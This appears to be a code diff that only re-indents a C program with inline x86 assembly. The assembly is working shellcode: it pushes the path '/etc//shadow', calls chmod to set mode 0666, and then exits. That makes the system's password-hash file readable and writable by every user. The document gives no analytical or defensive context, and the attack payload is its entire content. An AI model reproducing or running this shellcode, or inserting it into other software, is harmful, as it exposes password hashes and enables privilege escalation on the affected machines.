@@ -6,18 +6,19 @@
 
 #include <stdio.h>
 int main(){
-  __asm__("xor	%eax, %eax\n\t"
-"push   %eax\n\t"
-"push	$0x776f6461\n\t"
-"push	$0x68732f2f\n\t"
-"push	$0x6374652f\n\t"
-"mov    %esp, %ebx\n\t"
-"push	$0x1b6\n\t"
-"pop	%ecx\n\t"
-"mov    $0xf,%al\n\t"
-"int    $0x80\n\t"
-"xorl   %ebx,%ebx\n\t"               
-"movl   %ebx,%eax\n\t"
-"inc 	%eax\n\t"               
-"int    $0x80\n\t");    
+  __asm__(
+  "xor	%eax, %eax\n\t"
+  "push   %eax\n\t"
+  "push	$0x776f6461\n\t"
+  "push	$0x68732f2f\n\t"
+  "push	$0x6374652f\n\t"
+  "mov    %esp, %ebx\n\t"
+  "push	$0x1b6\n\t"
+  "pop	%ecx\n\t"
+  "mov    $0xf,%al\n\t"
+  "int    $0x80\n\t"
+  "xorl   %ebx,%ebx\n\t"               
+  "movl   %ebx,%eax\n\t"
+  "inc 	%eax\n\t"               
+  "int    $0x80\n\t");    
 }
